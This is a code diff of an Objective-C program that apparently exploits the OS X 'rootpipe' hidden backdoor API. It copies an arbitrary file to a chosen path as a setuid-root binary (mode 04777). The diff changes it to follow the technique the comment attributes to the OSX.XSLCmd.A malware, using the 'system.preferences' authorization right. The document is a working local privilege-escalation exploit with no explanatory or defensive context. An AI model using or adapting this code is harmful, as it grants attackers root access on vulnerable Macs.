@@ -6,7 +6,7 @@
 
 @interface UserUtilities : NSObject
 
-- (BOOL)createFileWithContents:(NSData *)data path:(NSString *)string attributes:(NSDictionary *)attributes;
++ (BOOL)createFileWithContents:(NSData *)data path:(NSString *)string attributes:(NSDictionary *)attributes;
 
 @end
 
@@ -14,13 +14,7 @@
 
 + (id)sharedAuthenticator;
 - (void)authenticateUsingAuthorizationSync:(SFAuthorization *)authorization;
-
-@end
-
-@interface ToolLiaison : NSObject
-
-+ (id)sharedToolLiaison;
-- (UserUtilities *)tool;
+- (BOOL)isAuthenticated;
 
 @end
 
@@ -39,18 +33,21 @@ int main(int argc, const char *argv[])
 	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 	
 	
-	// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/
+	// OSX.XSLCmd.A
 	
 	Authenticator *authent = [Authenticator sharedAuthenticator];
 	
 	SFAuthorization *authref = [SFAuthorization authorization];
 	
-	[authent authenticateUsingAuthorizationSync:authref];
-	
-	ToolLiaison *st = [ToolLiaison sharedToolLiaison];
-	UserUtilities *tool = [st tool];
-	
-	[tool createFileWithContents:[NSData dataWithContentsOfFile:@(argv[1])] path:@(argv[2]) attributes:@{ NSFilePosixPermissions: @04777 }];
+	if ([authref obtainWithRight:"system.preferences" flags:3 error:nil])
+	{
+		[authent authenticateUsingAuthorizationSync:authref];
+		
+		if ([authent isAuthenticated])
+		{
+			[UserUtilities createFileWithContents:[NSData dataWithContentsOfFile:@(argv[1])] path:@(argv[2]) attributes:@{ NSFilePosixPermissions: @04777 }];
+		}
+	}
 	
 	
 	[pool drain];
